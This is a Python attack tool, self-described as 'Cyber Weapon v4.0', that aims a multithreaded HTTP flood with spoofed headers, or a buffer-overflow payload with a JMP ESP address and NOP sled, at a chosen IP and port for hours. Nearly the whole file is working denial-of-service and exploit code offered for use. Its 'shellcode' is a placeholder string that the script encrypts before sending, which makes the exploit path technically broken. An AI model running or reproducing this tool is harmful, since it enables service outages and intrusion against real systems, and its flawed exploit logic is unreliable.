#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: mrDahmsh (@Dahmsh_0x1337)

import socket
import struct
import time
import random
import threading
import argparse
import os
import zlib
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from colorama import Fore, Style, init
import ssl

init(autoreset=True)

# ###############################################################
#                      GLOBAL CONFIGURATION                     #
# ###############################################################
BANNER = f"""
{Fore.CYAN}
██████╗ ██████╗  ██████╗ ███████╗██████╗ ████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝   ██║   
██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗   ██║   
██║     ██║  ██║╚██████╔╝███████╗██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   
{Fore.RED}Cyber Weapon v4.0{Style.RESET_ALL}
{Fore.YELLOW}>> Developed by: mrDahmsh <<{Style.RESET_ALL}
"""

class CyberWeapon:
    def __init__(self, args):
        self.target_ip = args.target
        self.target_port = args.port
        self.threads = args.threads
        self.offset = args.offset
        self.jmp_esp = args.jmp_esp
        self.attack_duration = args.duration * 3600
        self.ssl_enabled = args.ssl
        self.mode = args.mode

        # Advanced Configuration
        self.aes_keys = [os.urandom(32) for _ in range(10)]
        self.xor_keys = [os.urandom(64) for _ in range(5)]
        self.ssl_context = self.init_ssl()

        # Statistics
        self.stats = {'success': 0, 'failed': 0}
        self.lock = threading.Lock()
        self.running = True

    def init_ssl(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def print_config(self):
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {self.target_ip}:{self.target_port}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Threads: {self.threads} | Mode: {self.mode}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Encryption: AES-256 + XOR")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} SSL Enabled: {self.ssl_enabled}")

    # ------------------- Encryption Functions -------------------
    def encrypt_payload(self, data):
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.aes_keys[0]), modes.CBC(os.urandom(16)))
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded) + encryptor.finalize()

        xor_key = self.xor_keys[0]
        return bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(encrypted)])

    # ------------------- Attack Vectors -------------------
    def generate_http_flood(self):
        headers = [
            f"User-Agent: {self.random_ua()}",
            f"X-Forwarded-For: {self.spoof_ip()}",
            "Accept-Encoding: gzip, deflate",
            f"Cookie: {os.urandom(8).hex()}={os.urandom(16).hex()}"
        ]
        return (
            f"GET /{os.urandom(4).hex()} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

    def generate_exploit_payload(self):
        payload = (
            b"A" * self.offset +
            struct.pack("<I", self.jmp_esp) +
            b"\x90" * 16 +
            self.encrypt_payload(b"EXPLOIT SHELLCODE")
        )
        return payload

    # ------------------- Network Operations -------------------
    def send_attack(self):
        try:
            if self.ssl_enabled:
                sock = socket.create_connection((self.target_ip, self.target_port))
                ssock = self.ssl_context.wrap_socket(sock)
            else:
                ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssock.connect((self.target_ip, self.target_port))

            if self.mode == "exploit":
                payload = self.generate_exploit_payload()
            else:
                payload = self.generate_http_flood()

            ssock.send(payload)
            return True
        except Exception:
            return False
        finally:
            if 'ssock' in locals():
                ssock.close()

    # ------------------- Utility Functions -------------------
    def random_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]
        return random.choice(agents)

    def spoof_ip(self):
        return ".".join(str(random.randint(1, 255)) for _ in range(4))

    # ------------------- Thread Management -------------------
    def attack_cycle(self):
        start_time = time.time()
        while time.time() - start_time < self.attack_duration and self.running:
            if self.send_attack():
                with self.lock:
                    self.stats['success'] += 1
            else:
                with self.lock:
                    self.stats['failed'] += 1

    def stats_monitor(self):
        while self.running:
            with self.lock:
                print(
                    f"\r[+] Success: {self.stats['success']} | Failed: {self.stats['failed']}",
                    end=""
                )
            time.sleep(1)

    # ------------------- Main Control -------------------
    def start(self):
        print(BANNER)
        self.print_config()

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_cycle)
            t.daemon = True
            t.start()
            threads.append(t)

        monitor = threading.Thread(target=self.stats_monitor)
        monitor.start()

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

        monitor.join()
        print("\n\n[+] Attack Summary:")
        print(f"    Total Payloads: {self.stats['success'] + self.stats['failed']}")
        print(f"    Success Rate: {self.stats['success'] / (self.stats['success'] + self.stats['failed']) * 100:.2f}%")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CyberWeapon - Advanced Cyber Attack Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-m", "--mode", choices=["exploit", "flood"], default="exploit", help="Attack mode")
    parser.add_argument("--threads", type=int, default=500, help="Number of threads")
    parser.add_argument("--offset", type=int, default=1896, help="Buffer overflow offset")
    parser.add_argument("--jmp-esp", type=lambda x: int(x, 16), default=0x625011B3, help="JMP ESP address (hex)")
    parser.add_argument("--duration", type=int, default=1, help="Attack duration in hours")
    parser.add_argument("--ssl", action="store_true", help="Enable SSL/TLS")

    args = parser.parse_args()
    weapon = CyberWeapon(args)
    weapon.start()
